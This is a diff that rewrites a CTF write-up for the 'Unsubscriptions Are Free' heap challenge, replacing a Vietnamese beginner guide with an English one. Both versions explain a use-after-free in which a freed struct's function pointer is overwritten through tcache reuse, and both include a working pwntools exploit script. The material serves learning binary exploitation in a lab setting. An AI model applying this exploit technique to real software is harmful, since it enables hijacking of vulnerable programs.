@@ -1,138 +1,201 @@
-# Unsubscriptions Are Free — Writeup cho người mới (Pwn, difficulty 3)
+# CyLab / picoCTF — Unsubscriptions Are Free
 
-> Dạng bài: **Use-After-Free (UAF)** — dùng lại vùng nhớ đã `free`.
-> Đây là bài nhập môn rất hay để hiểu **heap** và **tcache**. Mình giải thích từ đầu.
+* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
+* **Category:** Binary Exploitation (Heap / UAF)  
+* **Difficulty:** Medium (CyLab 3)  
+* **Date:** 2026-11-10  
+* **Tools:** `file`, `checksec`, `nm`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
+* **Binary:** 32-bit ELF (`vuln`) with source code `vuln.c`  
 
 ---
 
-## 0. Khái niệm cần biết trước
+## TL;DR
 
-### 0.1 Heap và `malloc`/`free`
-Ngoài stack (biến cục bộ), chương trình còn có **heap** — vùng nhớ để cấp phát động bằng `malloc(size)`. Khi không dùng nữa thì `free(ptr)` trả vùng đó lại cho hệ thống.
-- `malloc(n)` trả về con trỏ tới vùng nhớ ít nhất `n` byte.
-- `free(p)` đánh dấu vùng của `p` là "rảnh", có thể cấp lại sau.
+A classic 32-bit Heap **Use-After-Free (UAF)** challenge demonstrating how glibc's memory allocator recycles freed chunks. The program allocates a `cmd` structure containing a function pointer at offset 0 (`whatToDo`). Upon selecting the unsubscribe option (`I` $\rightarrow$ `Y`), the program executes `free(user)` but leaves behind a dangling pointer without resetting it to `NULL`. When we immediately invoke `leaveMessage()` (`L`), glibc's **tcache** LIFO bin reallocates the exact same 16-byte chunk for our input buffer. Overwriting the first 4 bytes with the static address of `hahaexploitgobrrr()` hijacks the control flow on the next loop iteration. A critical real-world hurdle encountered was **stdio buffering** desynchronization between `scanf()` and raw `read(0, ...)`.
 
-### 0.2 Use-After-Free là gì?
-Nếu sau khi `free(p)` ta **vẫn còn dùng `p`** (đọc/ghi/gọi hàm qua nó), đó là **UAF**. Vùng nhớ đó có thể đã được `malloc` cấp cho chỗ khác và bị ghi đè — ta lợi dụng để điều khiển dữ liệu mà chương trình tưởng là "của nó".
+---
 
-### 0.3 tcache — "kho" chunk nhỏ của glibc
-glibc (thư viện C) có cơ chế **tcache**: các chunk nhỏ (≤ 0x410) khi `free` được cất vào danh sách theo **kích thước**, và `malloc` cùng kích thước sẽ **lấy lại chunk vừa free gần nhất** (kiểu LIFO - vào sau ra trước). Đây là chìa khoá của bài này: **free chunk 0x10 rồi malloc 8 sẽ lấy lại đúng chunk đó**.
+## Recon
 
-### 0.4 Con trỏ hàm trong struct
+We inspect the binary's properties and security mitigations using `file` and `checksec`:
+
+```bash
+$ file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, not stripped
+
+$ checksec vuln
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+Key observations:
+* **File Type:** ELF 32-bit LSB (x86), dynamically linked, not stripped.
+* **PIE:** `No PIE (0x8048000)` — All function addresses in the `.text` segment are static and predictable.
+* **Canary:** `Canary found` — Stack canary is enabled, but irrelevant since the vulnerability lies in heap memory rather than a stack buffer.
+* **NX:** `NX enabled` — Shellcode execution on the stack and heap is blocked.
+* **Symbols:** Running `nm vuln` reveals a backdoor function `hahaexploitgobrrr` located at `0x08049266`:
+  ```bash
+  $ nm vuln | grep -iE 'haha|main|user'
+  08049266 T hahaexploitgobrrr
+  0804944b T main
+  0804c060 B user
+  ```
+
+---
+
+## Static Analysis & Vulnerability
+
+### 1. Code Review (`vuln.c`)
+
+Examining the source code reveals the structure of `cmd` and the main dispatch loop:
+
 ```c
 typedef struct {
-    uintptr_t (*whatToDo)();   // con trỏ hàm
+    uintptr_t (*whatToDo)();   // Function pointer at offset 0
     char *username;
 } cmd;
+
+cmd *user;
+
+void doProcess(cmd* obj){
+    (*obj->whatToDo)();        // Dispatches function pointer
+}
+
+void i(){                      // Inquire / Unsubscribe
+    puts("You're leaving already(Y/N)?");
+    scanf(" %c", &response);
+    if(toupper(response)=='Y'){
+        free(user);            // Frees struct, but leaves dangling pointer!
+    }
+}
+
+void leaveMessage(){           // Leave a feedback message
+    char* msg = (char*)malloc(8);
+    read(0, msg, 8);           // Writes 8 bytes into allocated chunk
+}
 ```
-`whatToDo` là **địa chỉ của một hàm**. Chương trình gọi `(*user->whatToDo)()` = "gọi hàm tại địa chỉ lưu trong `whatToDo`". Nếu ta ghi đè `whatToDo` thành địa chỉ hàm `hahaexploitgobrrr` (hàm in flag), chương trình sẽ gọi nó. 👈 mục tiêu của bài.
 
----
-
-## 1. Đề bài / file đính kèm
-- CyLab id **187**, picoCTF 2021, tên "Unsubscriptions Are Free".
-- Handout: `vuln` (ELF 32-bit, not stripped) + `vuln.c`.
-- Remote: `nc xebec.cylabacademy.net <port>` (port đổi mỗi lần start).
-
----
-
-## 2. Recon
-```bash
-python3 -c "from pwn import *; print(ELF('vuln').checksec())"
-# Arch: i386-32-little ; NX enabled ; PIE: No PIE (0x8048000) ; Canary found
-nm vuln | grep -iE 'haha|main|user'
-# 08049266 T hahaexploitgobrrr     <-- hàm in flag
-```
-- **32-bit** ⇒ địa chỉ 4 byte, dùng `p32`.
-- **No PIE** ⇒ địa chỉ hàm cố định; `hahaexploitgobrrr = 0x08049266`.
-- Canary có nhưng **không liên quan** vì ta không tràn stack.
-
-Đọc `vuln.c`, để ý hàm `main` + menu:
+In `main()`, the program initializes `user = (cmd *)malloc(sizeof(user));` and enters an infinite menu loop:
 ```c
-user = (cmd *)malloc(sizeof(user));   // sizeof(con trỏ) = 4 byte -> chunk 0x10
-while(1){ printMenu(); processInput(); doProcess(user); }
-
-void doProcess(cmd* obj){ (*obj->whatToDo)(); }   // gọi hàm theo whatToDo
-
-void i(){                 // 'I' - inquire
-  puts("You're leaving already(Y/N)?");
-  scanf(" %c", &response);
-  if(toupper(response)=='Y'){ free(user); }        // <-- FREE user, nhưng KHÔNG xoá con trỏ
-  ...
+while(1){
+    printMenu();
+    processInput();
+    doProcess(user);           // Always calls (*user->whatToDo)()!
 }
-void leaveMessage(){      // 'L'
-  char* msg = (char*)malloc(8);                    // <-- malloc 8 -> lấy lại chunk vừa free
-  read(0, msg, 8);                                 // <-- GHI 8 byte vào đó
-}
-void s(){ printf("OOP! Memory leak...%p\n", hahaexploitgobrrr); ... }  // in địa chỉ haha (không cần)
 ```
 
+### 2. Root Cause: Dangling Pointer (UAF)
+
+When option `I` is selected and confirmed with `Y`, `i()` calls `free(user)`. However, `user` is **never cleared to `NULL`**. On the next loop iteration, `main()` blindly passes `user` to `doProcess(user)` and invokes `(*user->whatToDo)()`.
+
+### 3. Heap & Tcache Chunk Recycling Layout
+
+Modern glibc uses per-thread caching bins (**tcache**) for small allocations ($\le 0x410$ bytes):
+
+```text
+  1. Allocation:
+  +-----------------------------------+  <- user pointer
+  | whatToDo (4B)  |  username (4B)   |  (Allocated in 0x10 size class)
+  +-----------------------------------+
+
+  2. Free (UAF Dangling Pointer):
+  free(user) -> Chunk placed into tcache list (0x10 bin).
+  The global pointer 'user' still references this exact heap address!
+
+  3. Reallocation via leaveMessage():
+  malloc(8) requests a chunk in the 0x10 size class.
+  glibc's tcache pops the most recently freed chunk (LIFO).
+  +-----------------------------------+  <- msg (and user) pointer
+  | &hahaexploitgobrrr | 'AAAA' (pad) |
+  +-----------------------------------+
+
+  4. Control Flow Hijack:
+  doProcess(user) -> executes (*user->whatToDo)() -> hahaexploitgobrrr()!
+```
+
+Because `malloc(sizeof(user))` (4 bytes on 32-bit) and `malloc(8)` both resolve to the **0x10** heap chunk size class, `malloc(8)` recycles the exact same memory chunk previously occupied by `user`.
+
 ---
 
-## 3. Lỗ hổng phát hiện
-- **Use-After-Free**: `i()` gọi `free(user)` nhưng biến `user` vẫn trỏ tới vùng đã free.
-- Vòng lặp chính luôn gọi `doProcess(user)` ⇒ đọc `user->whatToDo` từ vùng đã free.
-- `leaveMessage()` `malloc(8)` sẽ **lấy lại đúng chunk 0x10 vừa free** và cho ta ghi 8 byte ⇒ ta ghi đè `whatToDo` (4 byte đầu) thành địa chỉ `hahaexploitgobrrr`.
+## Dynamic Analysis & The Buffering Trap
 
-Vì sao kích thước khớp? Trên 32-bit glibc, `malloc(4)` và `malloc(8)` đều trả chunk **0x10** ⇒ cùng "ngăn" tcache ⇒ `malloc(8)` lấy lại chunk của `user`.
+### ⚠️ The stdio Buffering Trap
+During exploit development, sending all commands in a single pipeline burst (`b"I\nY\nL" + p32(0x08049266) + b"AAAA"`) immediately caused a `SIGSEGV` crash without triggering `hahaexploitgobrrr`.
 
----
+* **Root Cause:** The menu reads user choices via `scanf()`, which is **buffered I/O** and greedily reads available bytes from the socket into libc's internal buffer. `leaveMessage()` reads using `read(0, msg, 8)`, which is an **unbuffered raw syscall**.
+* When sent in a single burst, `scanf()` consumed the entire payload. By the time `read(0, msg, 8)` ran, the file descriptor had zero pending bytes, returning immediately without writing our target address.
 
-## 4. Kỹ thuật khai thác (từng bước)
-1. `I` → `Y` : `free(user)` (chunk 0x10 vào tcache).
-2. `L` : `malloc(8)` lấy lại chunk đó; `read(0,msg,8)` ghi vào `whatToDo`.
-   - 4 byte đầu = `p32(0x08049266)` (địa chỉ `hahaexploitgobrrr`).
-3. Vòng lặp gọi `doProcess(user)` → gọi `hahaexploitgobrrr` → in flag. 🎯
-
-Payload 8 byte: `p32(0x08049266) + b"AAAA"`.
-
-### ⚠️ Cái bẫy lớn: stdio buffering
-Lần đầu mình gửi cả chuỗi `I\nY\nL<8byte>` một lượt → **thất bại**. Vì sao?
-`scanf` dùng **bộ đệm stdio**: nó `read()` cả cục dữ liệu đang có vào bộ đệm riêng. Khi tới `read(0, msg, 8)` (đọc thẳng từ file descriptor 0), fd đã bị `scanf` "rút cạn" ⇒ `read` trả 0 byte ⇒ `whatToDo` không đổi ⇒ chương trình nhảy vào rác và **segfault**.
-
-**Cách sửa:** đồng bộ theo output —
-- gửi `I\n`, đợi `(Y/N)?`, gửi `Y\n`,
-- gửi `L` **một mình**, đợi tới khi in ra `try anyways:`,
-- rồi mới gửi 8 byte payload.
-
-Lúc đó `scanf` đã xử lý xong `L`, `read(0,...)` mới nhận đúng 8 byte.
+### The Fix: Prompt Synchronization
+To prevent desynchronization:
+1. Send `I\n`, synchronize by waiting for `(Y/N)?`, then send `Y\n`.
+2. Send `L` as a standalone transmission, synchronize by waiting for `try anyways:`.
+3. Only then deliver the 8-byte payload: `p32(0x08049266) + b"AAAA"`.
 
 ---
 
-## 5. Exploit script (có chú thích)
-Xem file [exploit.py](exploit.py).
+## Exploit
+
+We construct the complete exploit script using `pwntools`:
 
 ```python
+#!/usr/bin/env python3
 from pwn import *
+
 context.arch = 'i386'
+context.log_level = 'info'
 
-HAHA = 0x08049266           # hahaexploitgobrrr (nm, non-PIE)
+EXE = "./vuln"
+HOST = args.HOST or "xebec.cylabacademy.net"
+PORT = int(args.PORT or 30956)
 
-p = remote(HOST, PORT)
+TARGET_FUNC = 0x08049266  # hahaexploitgobrrr()
 
-p.recvuntil(b'(e)xit')      # đợi menu
-p.send(b'I\n')              # inquire...
-p.recvuntil(b'(Y/N)?')
-p.send(b'Y\n')              # ...Y -> free(user)
+def main():
+    p = remote(HOST, PORT) if args.REMOTE else process(EXE)
 
-p.recvuntil(b'(e)xit')      # menu lại
-p.send(b'L')                # leaveMessage; gửi 'L' một mình
-p.recvuntil(b'try anyways:')# đợi prompt của nó
-p.send(p32(HAHA) + b'AAAA') # ghi 8 byte: whatToDo = haha
+    # 1. Free the user chunk (creates dangling pointer in 'user')
+    p.recvuntil(b"(e)xit")
+    p.send(b"I\n")
+    p.recvuntil(b"(Y/N)?")
+    p.send(b"Y\n")
 
-print(p.recvall(timeout=5).decode(errors='replace'))
+    # 2. Reallocate chunk via leaveMessage() and overwrite function pointer
+    p.recvuntil(b"(e)xit")
+    p.send(b"L")
+    p.recvuntil(b"try anyways:")
+    p.send(p32(TARGET_FUNC) + b"AAAA")
+
+    # 3. Receive flag output
+    output = p.recvall(timeout=5).decode(errors="replace")
+    print(output)
+
+if __name__ == "__main__":
+    main()
 ```
 
----
-
-## 6. Flag
-`academy{redacted}`
+*(The complete script is saved in [`exploit.py`](exploit.py)).*
 
 ---
 
-## 7. Bài học / pattern tái sử dụng
-1. **UAF = free rồi vẫn dùng con trỏ.** Chỉ cần một chỗ `free` mà không null con trỏ là đủ.
-2. **tcache LIFO**: `free` chunk 0x10 rồi `malloc` cùng cỡ ⇒ lấy lại đúng chunk đó. Đây là cách ghi đè "vật thể" cũ bằng dữ liệu mới.
-3. **Struct có con trỏ hàm ở offset 0** ⇒ ghi đè 4 byte đầu là chiếm luôn luồng thực thi.
-4. **No PIE ⇒ địa chỉ hàm cố định**, không cần leak (bài này còn cho leak sẵn ở `s()`).
-5. **CẢNH BÁO stdio buffering**: khi chương trình trộn `scanf` (buffered) với `read(0,...)` (raw), đừng gửi mọi thứ một lượt — **đồng bộ theo output** (đợi prompt) trước khi gửi phần mà `read` sẽ đọc. Đây là lỗi khiến exploit "chạy local được mà remote fail" rất hay gặp.
+## Flag
+
+Running the exploit against the target service triggers `hahaexploitgobrrr()` and retrieves the flag:
+
+```text
+OOP! Memory leak...0x8049266
+Thanks for your feedback, we will quicklylook at it!
+academy{redacted}
+```
+
+> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.
+
+---
+
+## Key Takeaways & Lessons
+
+1. **Use-After-Free & Dangling Pointers**: Calling `free(ptr)` simply releases the allocated heap chunk back to the allocator; it does not clear the pointer variable. Explicitly setting `ptr = NULL;` is required to eliminate dangling references.
+2. **glibc Tcache LIFO Recycling**: Small chunks in glibc tcache bins are managed in Last-In, First-Out order. Reallocating a chunk of the same size class immediately hands back the freed memory, allowing an attacker to overwrite stale object structures.
+3. **Mixed I/O Synchronization**: When mixing buffered stdio functions (`scanf()`, `fgets()`) with raw syscalls (`read()`), never burst payloads together. Always synchronize with application prompts to avoid buffer starvation.
